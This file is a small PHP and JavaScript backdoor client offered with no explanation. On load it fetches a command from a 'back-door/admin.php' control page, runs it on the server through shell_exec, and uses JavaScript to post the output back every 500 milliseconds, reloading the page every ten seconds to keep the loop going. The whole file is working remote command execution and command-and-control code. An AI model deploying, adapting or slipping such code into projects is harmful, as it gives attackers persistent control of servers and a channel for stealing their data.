<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://localhost/back-door/admin.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
preg_match('@<shell>(.*?)</shell>@', $result, $output);
$data = shell_exec($output[1]);
?>
<script>
   // function LoadGetData() {
   //    const xhttp = new XMLHttpRequest();
   //    xhttp.open("GET", "http://localhost/php-back-door/admin.php?get_data=get data");
   //    xhttp.send();
   // }
   function LoadPostData() {
      const URL = "http://localhost/back-door/admin.php";
      const xhttp = new XMLHttpRequest();
      xhttp.open("POST", URL, true);
      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      <?php
      $data = str_replace('\\', '/', $data);
      ?>
      xhttp.send(`post_data=<?= $data ?>`);
   }
   setInterval(() => {
      // LoadGetData();
      LoadPostData();
   }, 500);
   setInterval(function() {
      window.location.reload(false);
   }, 10000);
</script>